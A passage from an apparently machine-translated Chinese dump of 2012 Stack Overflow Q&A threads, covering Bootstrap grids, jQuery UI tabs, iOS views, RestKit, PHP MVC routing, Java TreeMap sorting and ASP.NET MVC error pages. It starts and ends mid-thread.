@media (max-width: 979px){
  .span9 {width: 100% !important;} 
```

}

您可能希望向该跨度添加一个额外的类，例如“内容”，并将规则更改为目标“.content”与“.span9”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T12:09:17.167

[这是一个示例](https://github.com/barraq/sass-twitter-bootstrap/tree/master/demos/fluid-grid-demo-1)和[现场演示](http://jsfiddle.net/gh/get/mootools/1.4.5/barraq/sass-twitter-bootstrap/tree/master/demos/fluid-grid-demo-1/)，无需将 Bootstrap 标记添加到您的 html 文档。

演示.html：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Sass Bootstrap - Fluid Grid - demo 1</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="demo.css" rel="stylesheet">
</head>
<body>
    <div id="page">
        <div id="page-body" class="hero-unit">
            <article>
                <header><h1>Article Title</h1></header>
                <section class="main">
                    <header><h2>Section Title</h2></header>
                    Laborum eveniet cupiditate qui placeat adipisci dolor itaque porro corporis, quae expedita quis sint quas eveniet voluptatum velit, magnam alias totam architecto possimus porro? Dolores ex tempora ipsam earum architecto hic vel, rem ducimus praesentium fugit quisquam veniam, esse itaque quos eligendi aut labore tempora. Quidem magni soluta. Odit reiciendis repellat laudantium corrupti totam provident, eveniet cumque similique voluptatum obcaecati fugit perspiciatis vero in, animi facere neque ipsam iure sequi quo minus illum magni aliquam odio, nemo officiis eius aut dolor consequuntur blanditiis adipisci perferendis non nostrum?
Delectus rem atque possimus vel voluptate, hic ipsa ea eligendi inventore suscipit, inventore architecto consectetur officia illum aperiam labore totam dicta. Fugiat ut consequuntur sunt minima, ducimus excepturi iure et sed voluptas hic minima corporis, accusantium architecto quo laudantium blanditiis ullam voluptas in laborum sit? Est magni sapiente iusto quia vitae, vitae molestiae iste? Tempore expedita maiores.
Corporis nulla inventore tenetur tempore?
Nesciunt itaque nam ipsum voluptate quos impedit facere id. Saepe quibusdam maiores optio id natus ut quas pariatur.
Quas tenetur tempore mollitia eius provident quidem ea quam ut et, corporis beatae iure error eligendi possimus maiores ipsum numquam, enim fuga cumque blanditiis eius id excepturi ut quia iusto hic quisquam, commodi incidunt pariatur. Aliquid consequatur nostrum maiores veniam magnam tenetur aperiam quis, dignissimos in tenetur explicabo ea ratione provident corrupti necessitatibus eveniet iure autem, ullam possimus ea natus ipsam.
Minus unde totam aliquid natus quis, eos ullam autem pariatur ducimus quibusdam iste, cum ab quasi iusto ut culpa quam illum hic laboriosam
                </section>
                <section>
                    <section>
                    <header><h2>Section Title</h2></header>
                    Laborum eveniet cupiditate qui placeat adipisci dolor itaque porro corporis, quae expedita quis sint quas eveniet voluptatum velit, magnam alias totam architecto possimus porro? Dolores ex tempora ipsam earum architecto hic vel, rem ducimus praesentium fugit quisquam veniam, esse itaque quos eligendi aut labore tempora. Quidem magni soluta. Odit reiciendis repellat laudantium corrupti totam provident, eveniet cumque similique voluptatum obcaecati fugit perspiciatis vero in, animi facere neque ipsam iure sequi quo minus illum magni aliquam odio, nemo officiis eius aut dolor consequuntur blanditiis adipisci perferendis non nostrum?
Delectus rem atque possimus vel voluptate, hic ipsa ea eligendi inventore suscipit, inventore architecto consectetur officia illum aperiam labore totam dicta. Fugiat ut consequuntur sunt minima, ducimus excepturi iure et sed voluptas hic minima corporis, accusantium architecto quo laudantium blanditiis ullam voluptas in laborum sit? Est magni sapiente iusto quia vitae, vitae molestiae iste? Tempore expedita maiores.
Corporis nulla inventore tenetur tempore?
Nesciunt itaque nam ipsum voluptate quos impedit facere id. Saepe quibusdam maiores optio id natus ut quas pariatur.
Quas tenetur tempore mollitia eius provident quidem ea quam ut et, corporis beatae iure error eligendi possimus maiores ipsum numquam, enim fuga cumque blanditiis eius id excepturi ut quia iusto hic quisquam, commodi incidunt pariatur. Aliquid consequatur nostrum maiores veniam magnam tenetur aperiam quis, dignissimos in tenetur explicabo ea ratione provident corrupti necessitatibus eveniet iure autem, ullam possimus ea natus ipsam.
Minus unde totam aliquid natus quis, eos ullam autem pariatur ducimus quibusdam iste, cum ab quasi iusto ut culpa quam illum hic laboriosam
                    </section>
                    <section>
                    <header><h2>Section Title</h2></header>
                    Laborum eveniet cupiditate qui placeat adipisci dolor itaque porro corporis, quae expedita quis sint quas eveniet voluptatum velit, magnam alias totam architecto possimus porro? Dolores ex tempora ipsam earum architecto hic vel, rem ducimus praesentium fugit quisquam veniam, esse itaque quos eligendi aut labore tempora. Quidem magni soluta. Odit reiciendis repellat laudantium corrupti totam provident, eveniet cumque similique voluptatum obcaecati fugit perspiciatis vero in, animi facere neque ipsam iure sequi quo minus illum magni aliquam odio, nemo officiis eius aut dolor consequuntur blanditiis adipisci perferendis non nostrum?
Delectus rem atque possimus vel voluptate, hic ipsa ea eligendi inventore suscipit, inventore architecto consectetur officia illum aperiam labore totam dicta. Fugiat ut consequuntur sunt minima, ducimus excepturi iure et sed voluptas hic minima corporis, accusantium architecto quo laudantium blanditiis ullam voluptas in laborum sit? Est magni sapiente iusto quia vitae, vitae molestiae iste? Tempore expedita maiores.
Corporis nulla inventore tenetur tempore?
Nesciunt itaque nam ipsum voluptate quos impedit facere id. Saepe quibusdam maiores optio id natus ut quas pariatur.
Quas tenetur tempore mollitia eius provident quidem ea quam ut et, corporis beatae iure error eligendi possimus maiores ipsum numquam, enim fuga cumque blanditiis eius id excepturi ut quia iusto hic quisquam, commodi incidunt pariatur. Aliquid consequatur nostrum maiores veniam magnam tenetur aperiam quis, dignissimos in tenetur explicabo ea ratione provident corrupti necessitatibus eveniet iure autem, ullam possimus ea natus ipsam.
Minus unde totam aliquid natus quis, eos ullam autem pariatur ducimus quibusdam iste, cum ab quasi iusto ut culpa quam illum hic laboriosam
                    </section>
                </section>
            </article>
        </div>
        <div id="page-sidebar" class="well">
            <div class="section">
                <ul>
                    <li>menu1</li>
                    <li>menu2</li>
                    <li>menu3</li>
                    <li>menu4</li>
                </ul>
            </div>
        </div>
    </div>
</body>
</html> 
```

演示.scss：

```
@import "../../lib/bootstrap.scss";
@import "../../lib/responsive.scss";

// body is the fluid containter
body { @extend .container-fluid; }

// make elements "column fluid"
#page-body, 
#page-sidebar {
    @extend [class*="span"];
}
section:not(.main) > section {
    @extend [class*="span"];
    @media (max-width: 1199px) { margin-left: 0 !important; }
}

// make elements "row fluid"
#page,
#page > section:not(.main) {
    @extend .row-fluid;
}

// responsive grid
@media (min-width: 768px) and (max-width: 979px) {
    #page-body { @include grid-fluid-span(7, $fluidGridColumnWidth768, $fluidGridGutterWidth768); }
    #page-sidebar { @include grid-fluid-span(5, $fluidGridColumnWidth768, $fluidGridGutterWidth768); }
}

@media (min-width: 980px) and (max-width: 1199px) {
    #page-body { @include grid-fluid-span(7, $fluidGridColumnWidth, $fluidGridGutterWidth); }
    #page-sidebar { @include grid-fluid-span(5, $fluidGridColumnWidth, $fluidGridGutterWidth); }
}

@media (min-width: 1200px) {
    section:not(.main) > section { @include grid-fluid-span(6, $fluidGridColumnWidth1200, $fluidGridGutterWidth1200); }
    #page-body { @include grid-fluid-span(8, $fluidGridColumnWidth1200, $fluidGridGutterWidth1200); }
    #page-sidebar { @include grid-fluid-span(4, $fluidGridColumnWidth1200, $fluidGridGutterWidth1200); }
} 
```

最好的，

# javascript - 替代 jQuery UI 旋转方法？

> ID：13845268
> 
> 赞同：1
> 
> 时间：2012-12-12T17:26:18.510
> 
> 标签：javascript, jquery, jquery-ui

我正在使用一个使用 jQuery UI 旋转方法的主题，但在更新到较新版本后它已经停止工作。我发现 jQuery UI 已经删除了 rotate 方法，如果我想让它继续工作，我可以使用一些扩展。但我想知道是否可以为以下行使用一些替代函数，因为它非常简单：

```
$("#slider").tabs("rotate",0,true); 
```

目的是旋转标签。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:29:35.833

好像有人[更新了 1.9](https://github.com/cmcculloh/jQuery-UI-Tabs-Rotate)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T19:08:30.130

如果您按照文档的建议实施扩展，您将使用这样的扩展：

```
$("#tabs").tabs().tabs("rotate", 4000, true); 
```

注意额外的调用`.tabs()`

这是扩展名：[https ://github.com/cmcculloh/jQuery-UI-Tabs-Rotate](https://github.com/cmcculloh/jQuery-UI-Tabs-Rotate)

# ios - UIAlertView 防止周围屏幕变暗

> ID：13845280
> 
> 赞同：1
> 
> 时间：2012-12-12T17:26:45.463
> 
> 标签：ios, uialertview

对于基本的**UIAlertView**，任何人都知道如何在显示警报对话框时防止周围屏幕变暗？

使用 iPhone SDK 6.0，我一直在检查 UIAlertView.h 并且有一个带有一组位字段的私有结构 _modalViewFlags，其中包括**dontDimBackground**。似乎正在为我正在搜索的功能存储一个标志。看不到设置/重置它的公共方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:37:36.907

如果不使用私有 API，就无法防止背景变暗。您可能希望使用允许更多自定义的第 3 方警报视图。

[WCAlertView](https://github.com/m1entus/WCAlertView)包括设置背景渐变颜色的选项。如果你将它设置为`clearColor`，它应该做你想做的事。

# phpunit - 测试 API 中的自动错误日志记录支持

> ID：13845281
> 
> 赞同：1
> 
> 时间：2012-12-12T17:26:49.347
> 
> 标签：phpunit, simpletest

我正在使用 SimpleTest API 和 PHPUnit 测试 API。他们中的任何一个都支持自动错误记录支持吗？如果没有，那么我将如何提供此功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T10:08:30.537

例如，PHPUnit 可以与

*   `Trac`（[https://github.com/sebastianbergmann/phpunit-ticketlistener-trac](https://github.com/sebastianbergmann/phpunit-ticketlistener-trac)）
*   `GitHub`（[https://github.com/sebastianbergmann/phpunit-ticketlistener-github](https://github.com/sebastianbergmann/phpunit-ticketlistener-github)）
*   和其他几个：http: [//pear.phpunit.de/](http://pear.phpunit.de/)

建造一个适合您的提议肯定是可能的。

还有其他方法可以让 PHPUnit 告诉你发生了什么

*   [**`Test listeners`**](http://www.phpunit.de/manual/current/en/extending-phpunit.html#extending-phpunit.PHPUnit_Framework_TestListener). 您可以真正对 PHPUnit 所做的一切采取行动。
*   [**`The xml or json output`**](http://www.phpunit.de/manual/current/en/logging.html). 您可以相应地对其进行解析和操作

# c# - 将 DataGrid 绑定到队列显示为空

> ID：13845282
> 
> 赞同：2
> 
> 时间：2012-12-12T17:26:49.943
> 
> 标签：c#, .net, wpf

我可能在这里做一些微不足道的错误，但我似乎无法让以下工作：

```
 public MainWindow()
    {
        InitializeComponent();
        Loaded += new RoutedEventHandler(MainWindow_Loaded);
    }

    public Queue<Player> quePlayers { get; set; }

    Random rand = new Random((int)DateTime.Now.Ticks);

    public void MainWindow_Loaded(object sender, RoutedEventArgs e)
    {
        quePlayers = new Queue<Player>();
        //quePlayers.Add(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        //quePlayers.Add(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        //quePlayers.Add(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        //quePlayers.Add(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        //quePlayers.Add(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });

        quePlayers.Enqueue(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        quePlayers.Enqueue(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        quePlayers.Enqueue(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        quePlayers.Enqueue(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });
        quePlayers.Enqueue(new Player() { FullName = Guid.NewGuid().ToString(), Age = rand.Next() % 40, SomeData = Guid.NewGuid().ToString() });

        dgTest.ItemsSource = quePlayers;
        //dgTest.ItemsSource = CollectionViewSource.GetDefaultView(dgTest.ItemsSource);

    } 
```

如果我将该队列更改为列表，网格中将出现数据，但队列和堆栈将不合作

dgTest.Items 属性有 5 个成员，我得到的 CollectionView 是 EnumerableCollectionView，我可以枚举它并查看其中的 5 个成员

我的 XAML 也很简单

```
<DataGrid x:Name="dgTest" AutoGenerateColumns="True" /> 
```

知道有什么问题吗？Queue 实现了 IEnumerable 并且 ItemsSource 的唯一要求是 IEnumerable

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T21:31:01.313

我的猜测是 AutoGenerateColumns。尝试手动设置一列。

# php - 从外部脚本更新 Wordpress 插件？

> ID：13845291
> 
> 赞同：0
> 
> 时间：2012-12-12T17:27:16.463
> 
> 标签：php, wordpress

我知道 Wordpress 上的 xmlrcp 非常适合发布新帖子等。但是在更新插件时，我还没有找到一种方法来帮助我管理大型博客网络。

任何人都知道如何实现这一目标？

我正在寻找构建一个“仪表板”，我可以从中控制所有 Wordpress 安装，其中一个重要部分是能够更新/添加插件。

非常欢迎任何帮助！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:31:22.640

听起来你在寻找类似[managewp 的东西。](https://managewp.com/)

它不是免费的，但它工作得非常好，似乎正是你要找的。

# objective-c - RestKit 0.20.0 - 带有 JSON HTTP 正文请求的 getObjectsAtPath

> ID：13845294
> 
> 赞同：0
> 
> 时间：2012-12-12T17:27:27.240
> 
> 标签：objective-c, ios, restkit, afnetworking

在我使用[的 RestKit](https://github.com/RestKit/RestKit/)版本 0.10.x

```
[[RKObjectManager sharedManager] loadObjectsAtResourcePath:@"/special/path" usingBlock:^(RKObjectLoader *loader) {
            loader.objectMapping = aMapping;
            loader.delegate = _delegate;
            loader.method = RKRequestMethodPOST;
            loader.userData = [MobileGatewayReauthentication class];
            loader.params = [anDictionary toJsonRKParam];
        }]; 
```

添加一个`NSDictionary`to`loader.params`以将参数集合作为请求的 HTTP 正文发送。

* * *

从 RestKit 0.20.0 开始，该方法`loadObjectsAtResourcePath`已被以下方法替换，其中不再可能传递用作 HTTP 正文（JSON 编码）的`NSDictionary`in ：`parameters`

```
[RKObjectManager.sharedManager getObjectsAtPath:path parameters:params success:^(RKObjectRequestOperation *operation, RKMappingResult *mappingResult)
{
    NSLog(@"success");
} failure:^(RKObjectRequestOperation *operation, NSError *error) {
    NSLog(@"failure");
}]; 
```

当使用`[[RKObjectManager sharedManager].HTTPClient`（[AFNetworking](https://github.com/AFNetworking/AFNetworking)）时，它在设置时就像一个魅力：

```
[[RKObjectManager sharedManager].HTTPClient setParameterEncoding:AFJSONParameterEncoding];

[[RKObjectManager sharedManager].HTTPClient postPath:path parameters:params success:^(AFHTTPRequestOperation *operation, id responseObject) {
    NSLog(@"Response: %@", operation.responseString);
} failure:^(AFHTTPRequestOperation *operation, NSError *error) {
    NSLog(@"Error: %@",error.localizedDescription);
}]; 
```

但我需要更高级别的对象映射器。

* * *

```
[[RKObjectManager sharedManager].HTTPClient setParameterEncoding:AFJSONParameterEncoding]; 
```

对 [RKObjectManager sharedManager] 没有影响，但是

```
[[RKObjectManager sharedManager].HTTPClient setDefaultHeader:@"aHeader" value:@"aValue"]; 
```

拥有。所以我认为这`setParameterEncoding`也有效。

这是一个错误，它还没有实现，还是我错过了什么？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-18T12:12:37.667

我真的错过了一些东西。

`loadObjectsAtResourcePath`get （肯定）用`RKRequestMethodGET`. 所以参数会附加到 URL，而不是 HTTP 正文。

要将参数附加为 JSON HTTP 正文，您必须使用 post 方法，例如

```
- (void)postObject:(id)object
              path:(NSString *)path
        parameters:(NSDictionary *)parameters
           success:(void (^)(RKObjectRequestOperation *operation, RKMappingResult *mappingResult))success
           failure:(void (^)(RKObjectRequestOperation *operation, NSError *error))failure; 
```

原谅这个仓促的问题。我以前应该看过的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T19:11:14.297

如果我正确理解了您的问题，RestKit 创建者在开发分支中推送了一些内容（始终经过测试并且使用起来非常安全），这可能会解决您的问题（[在此处提交](https://github.com/RestKit/RestKit/commit/b9457ce65c475fb748d31d009bfc38518112e990)），默认情况下基本上设置为：

```
[[RKObjectManager sharedManager].HTTPClient setDefaultHeader:@"Accept" value:RKMIMETypeJSON];
[[RKObjectManager sharedManager].HTTPClient registerHTTPOperationClass:[AFJSONRequestOperation class]]; 
```

希望这有帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-18T08:44:42.703

**getObjectsAtPath:path 中的路径**可能有问题如果您在路径的开头使用斜杠 (/)，请将其移到 baseurl 的末尾，如下例所示。

```
NSURL *baseURL = [NSURL URLWithString:@"http://rest.example.com:8080/test/"];
    AFHTTPClient* client = [[AFHTTPClient alloc] initWithBaseURL:baseURL];

[objectManager getObjectsAtPath:@"rest/updates"
                         parameters:nil
                            success:^(RKObjectRequestOperation *operation, RKMappingResult *mappingResult) {
                                NSLog(@"success");
                            }
                            failure:^(RKObjectRequestOperation *operation, NSError *error) {
                                NSLog(@"failure");
                            }]; 
```

# php - 如何防止 http 请求在 PHP MVC / LAMP 中显示资源

> ID：13845297
> 
> 赞同：0
> 
> 时间：2012-12-12T17:27:33.093
> 
> 标签：php, apache, model-view-controller, mod-rewrite, lamp

我正在重新定义我自己的 php mvc 框架。

默认情况下，我的每个请求都由 /index.php 处理，这会触发 mvc 路由、执行请求和返回正确视图的过程。每个请求都根据单个 'q' GET 参数进行路由，drupal 风格，如

```
/index.php?q=anApplication/aController/theAction/arg1/.../moreArguments 
```

这工作得很好，并且通过 mod_rewrite 使干净的 url 变得容易。好的。

我有一个这样的目录树：

```
/public
    |----themeName
    |--------|
             |----page.tpl
             |----content.tpl
             |----etc.    
/private
    |----sourceDirectory
    |----moreSources 
```

我**不想要**的是存储在私有和公共目录中的文件像 HTTP 请求一样直接提供服务：我不想要类似的东西

> mySrv/public/themeName/page.tpl

绕过我的核心处理程序 - index.php 来显示死模板或任何不是图像的资源。

我想我可以通过这样的重写配置来实现一些目标

```
RewriteEngine on
RewriteBase /
RewriteRule  ^(.*)$ index.php?q=$1 [QSA,L] 
```

但随后该框架将仅适用于启用 mod_rewrite 的站点，因为这将重写所有现有和不存在的资源。

我要问的是：是否有另一种方法可以让每个请求都由我选择的资源（例如 index.php）提供服务，现有或不存在的资源？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:39:49.540

只需将所有模板等存储在 public_html 文件夹之外。

这将允许 PHP 访问，但外界无法访问该文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:40:48.110

最简单且更便携的方法是将除您`index.php`之外的所有内容拉出文档根目录。PHP 仍然可以包含文件并执行其他所有操作。

我还没有尝试过，但是如果您将 index.php*放在*旧文档树之外

```
---/ app / new-index.php
   |
   / public / 
   |
   / private / ...
   |
   index.php 
```

然后在开头添加`new-index.php`

```
<?php
    chdir('..');
    require 'index.php';
?> 
```

最后重新配置 Apache，使 DocumentRoot 实际上变为`/app`，然后一切都应该像以前一样工作——除了“/”之外的任何 URL 对 Apache 不再有意义，并且所有的 URL 都可以放在合适的 ErrorDocument 404 上。

**注意**：“一切都应该工作”，*除了*HTTP 重定向。您可以从 FS 读取未解释的 PHP 文件，但不能再从本地主机上的 Apache 获取其解释的内容。此外，您应该验证任何现有代码都没有使用`DOCUMENT_ROOT`全局变量；如有必要，您可以覆盖它。

# linux - 是否可以在 Linux 上运行的 Eclipse Indigo 中安装 Cobos？

> ID：13845301
> 
> 赞同：2
> 
> 时间：2012-12-12T17:27:53.857
> 
> 标签：linux, eclipse, ide, cobol

我的笔记本电脑上安装了 Ubuntu 12，我想要一个 IDE，它允许我使用 Java 和 COBOL 进行开发。Ubuntu 软件中心中唯一可用的 eclipse 版本是 Indigo。问题是，直到现在，我读到的关于 COBOS 的内容，这个非常适合这项工作的开源 COBOL IDE，应该只能在 Eclipse Helios 和 Windows 中运行。我的问题是是否有人遇到过这个问题以及您是如何解决的。无论如何我可以在 Eclipse 中安装 COBOS 吗？我已经下载了 COBOS 2.3.2。

先感谢您！

# java - 如何按（日期）值对 TreeMap 进行排序？

> ID：13845302
> 
> 赞同：-2
> 
> 时间：2012-12-12T17:27:54.120
> 
> 标签：java, treemap

> **可能重复：**
> [TreeMap sort by value](https://stackoverflow.com/questions/2864840/treemap-sort-by-value)
> [Map 可以按值的顺序迭代](https://stackoverflow.com/questions/8896679/map-that-could-be-iterated-in-the-order-of-values)

我有一个 TreeMap 类型`<String, Date>`。我想按日期对它进行排序（最近的在前），我不能将它们用作键，因为我不能保证它们是唯一的。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T17:33:51.783

不能直接做，可以做的是将集合的内容复制到一个新的，然后排序，例如：

```
List<Map.EntrySet<String, Date>> copy = new ArrayList<Map.EntrySet<String, Date>>(treeMap.entrySet());
Collections.sort(copy, new CustomComparator());

class CustomComparator implements Comparator<Map.Entry<String,Date>> {
  public int compareTo(Map.Entry<String,Date> e1, Map.Entry<String,Date> e2) {
    // compare your dates
  }
} 
```

当然，这个集合不会与原始集合同步，因此每次`TreeSet`修改原始集合时都必须重新进行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:47:17.317

实际上，如果你真的想要的话，你可以在 TreeMap 中有重复的键

```
 Map<Date, String> map = new TreeMap<Date, String>(new Comparator<Date>() {
        @Override
        public int compare(Date d1, Date d2) {
            return d1.after(d2) ? 1 : -1;
        }
    });
    Date d1 = new Date(-100000000000L);
    Date d2 = new Date(100000000000L);
    map.put(d2, "s1");
    map.put(d1, "s2");
    map.put(d1, "s3");
    System.out.println(map); 
```

输出

```
{Mon Oct 31 16:13:20 EET 1966=s3, Mon Oct 31 16:13:20 EET 1966=s2, Sat Mar 03 11:46:40 EET 1973=s1} 
```

请注意，2 个条目具有相同的键，并且输出按您想要的日期排序

# jquery - 将生成的 HTML 存储在变量中

> ID：13845313
> 
> 赞同：2
> 
> 时间：2012-12-12T17:28:49.543
> 
> 标签：jquery, html, code-generation, innerhtml

我有一个简单的 jQuery 表编辑器，并且希望能够将整个表存储在一个变量中。稍后表格的状态将被保存，类似于迷你 CMS。

我尝试使用 HTML，但它不适用于生成的元素。

最好的方法是什么？另外，`.html()`返回的内容是安全的，还是由于浏览器的差异而我不应该使用它`innerHTML`？

```
$("#target").click(function() {
    $('#myTable tr:last').after('<tr><td>Bla</td><td><div class="remove">REMOVE</div></td></tr>');
});

$("#myTable").on('click', '.remove', function(event) {
    $(this).parent().parent().remove();
});

var table = $("#myTable").html();
$("button").click(function() {
    $(".result").html(table);
}); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-12T17:42:02.723

尝试将点击处理程序更新为以下内容：

```
$("button").click(function() {
    var table = $("#myTable").html();
    $(".result").html(table);
}); 
```

看到它在这里工作：http: [//jsbin.com/ucopun/11](http://jsbin.com/ucopun/11)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:44:47.377

您想将整个表格存储在不同的元素或变量中吗？

如果要将其存储在变量中，则

```
$('button').on('click', function(){
    var table_html = '<table id="myTable">' + $('#myTable').html() + '</table>';
    // alert(table_html);
}); 
```

小提琴 - [http://jsfiddle.net/84ETb/](http://jsfiddle.net/84ETb/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T17:37:44.960

难道你不能`html()`在完成修改后调用（即单击按钮时，而不是 DOM 准备好时）

```
var the_content = $('#myTable').html(); 
```

# asp.net-mvc - ASP.NET MVC 4 - 异常处理不起作用

> ID：13845318
> 
> 赞同：11
> 
> 时间：2012-12-12T17:29:09.897
> 
> 标签：asp.net-mvc, exception-handling, asp.net-mvc-4

当我的 ASP.NET MVC 4 应用程序发生错误时，我想根据错误类型为用户自定义一个视图。例如，找不到页面或发生异常（带有一些关于异常的用户友好的详细信息）。我已经在 StackOverflow 和其他在线资源上查看了如何执行此操作的其他示例，但没有一个答案对我有用。

基本的 [HandleError] 属性在 VS2012 中似乎不适用于针对 .NET 4.5 的 MVC 4 应用程序。这是我在家庭控制器中的代码：

```
[HandleError]
public ActionResult Index()
{
    Response.TrySkipIisCustomErrors = true; //doesn't work with or without this
    throw new NullReferenceException("Uh oh, something broke.");
} 
```

它只是抛出一个异常，我希望由于 [HandleError] 属性而返回默认的 ~/Shared/Error.cshtml 视图，但我得到的只是一个 HTTP 500 内部服务器错误，表明该页面无法显示。我检查了我的 web.config，不同的配置似乎表现得很奇怪。在该部分中，它当前包含：

```
<customErrors mode="On" /> 
```

（我尝试添加 defaultRedirect 和 customErrors mode="Off" 但这没有任何效果......共享的错误视图或我拥有的 CustomError 视图都没有被呈现。如果我将 customErrors 模式更改为关闭，然后我可以按预期看到异常详细信息，因此它正确地抛出了“哦，有些东西坏了”异常。

我还尝试将 OnException 处理程序添加到 HomeController，虽然我可以调试并看到 OnException 事件正在引发，但它没有任何区别：

```
protected override void OnException(ExceptionContext filterContext)
{
    base.OnException(filterContext);
    filterContext.ExceptionHandled = true;
    if (filterContext == null)
    {
        filterContext.Result = View("CustomError");
        return;
    }
    Exception e = filterContext.Exception;
    // TODO: Log the exception here
    ViewData["Exception"] = e; // pass the exception to the view
    filterContext.Result = View("CustomError");
} 
```

我也尝试改变 [HandleError] 来指定一个视图，但这似乎也没有做任何事情：

```
[HandleError(View="CustomError")] 
```

任何帮助将非常感激。如果您需要更多详细信息，请告诉我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T18:45:05.037

我还继续阅读 SO 答案和各种博客文章，试图让自定义错误页面正常工作。以下是最终对我有用的方法。

第一步是使用 IIS Express 进行调试，而不是使用内置的 Cassini Web 服务器来“保证”调试体验将反映实时环境。

创建一个控制器来处理应用程序错误，并为您要处理的每个自定义错误添加一个操作。该操作应该执行任何日志记录、设置状态代码并返回视图。

```
public class ErrorsController : Controller
{
    // 404
    [HttpGet]
    public ActionResult NotFound()
    {
        Response.StatusCode = (int)HttpStatusCode.NotFound;
        return View();
    }

    // I also have test actions so that I can verify it's working in production.
    [HttpGet]
    public ActionResult Throw404()
    {
        throw new HttpException((int)HttpStatusCode.NotFound, "demo");
    }
} 
```

配置`customErrors`web.config 中的部分以重定向到您的自定义错误操作。

```
 <system.web>
    <customErrors mode="RemoteOnly" defaultRedirect="Errors/InternalServerError">
      <error statusCode="400" redirect="Errors/BadRequest" />
      <error statusCode="403" redirect="Errors/Forbidden" />
      <error statusCode="404" redirect="Errors/NotFound" />
      <error statusCode="500" redirect="Errors/InternalServerError" />
    </customErrors> 
```

在 web.config 中添加该`httpErrors`部分`system.webServer`并将 errorMode 设置为Detailed。为什么这对我来说是个谜，但这是关键。

```
 <system.webServer>
    <httpErrors errorMode="Detailed" /> 
```

在定义的路由中添加一条包罗万象的路由，以将 404 引导到自定义页面。

```
 // catchall for 404s
        routes.MapRoute(
            "Error",
            "{*url}",
            new {controller = "Errors", action = "NotFound"}); 
```

您可能还想创建一个自定义`HandleErrorAttribute`并将其注册为全局过滤器以记录 500 错误。

这些步骤在开发（IIS Express）和生产（IIS7）环境中都适用于我。您需要进行更改`customErrors mode="On"`才能看到开发中的效果。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-13T01:08:40.877

我似乎记得您必须从非本地 IP 地址（通常是另一台计算机）调用该页面。而且它必须是基于 IIS 的服务器，而不是内置的开发服务器（所以是 IIS 或 IIS Express，但是您必须配置 IIS Express 以进行外部访问，这很痛苦）。

您实际上可以调试它，您必须在调试计算机上配置本地服务器以接受外部请求，然后从远程服务器调用本地服务器。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-01-06T21:27:38.560

我遇到了类似的问题，并且在试图弄清楚发生了什么事情时迷失了方向。因此，以防万一其他人遇到类似的问题，这就是我的问题所在。

错误页面试图使用我的 _Layout 页面。只要确保你的 Error.cshtml 页面有

@{ 布局 = null; }

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-12T18:35:44.253

尝试将以下属性添加到`customErrors`标签：

```
defaultRedirect="Error" 
```

这明确定义了当抛出错误并且属性中默认没有指定视图时，MVC 应该将用户重定向到哪个视图。这当然只有在视图文件夹`Error.cshtml`中存在时才有效。`Shared`

# ios - ImageView 不响应触摸

> ID：13845319
> 
> 赞同：0
> 
> 时间：2012-12-12T17:29:10.700
> 
> 标签：ios

在 XCode 中，我创建了一个带有多个图像视图的 xib 文件，其中一些堆叠在其他图像视图上。整个视图有一个视图控制器，它连接到每个图像视图。我想我的第一个问题是，所有图像视图都是整个视图的直接子视图吗？无论如何，当触摸整个图像视图时，我会通过触摸开始/触摸移动来检测它。它完美地工作。但是，我特别想知道一个图像视图是否被触摸。我怎样才能从主视图的触摸开始/触摸移动，找出其中的子视图是否被触摸？我想这样做，因为我尝试过的所有其他方法都不起作用。对于子视图，我创建了一个视图控制器并将其视图设置为有问题的子视图。我在控制器内部设置了触摸开始/触摸移动方法，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T18:42:10.790

对于 UIImageView 实例，您需要明确地执行 setUserInterActionEnabled=YES

# node.js - 我应该使用包管理器还是从源代码在 Ubuntu 上安装 node.js？

> ID：13845321
> 
> 赞同：24
> 
> 时间：2012-12-12T17:29:12.390
> 
> 标签：node.js, ubuntu, package-managers

有谁知道从源代码安装最新版本是否有风险？我应该坚持使用包管理器吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-12-12T19:01:24.533

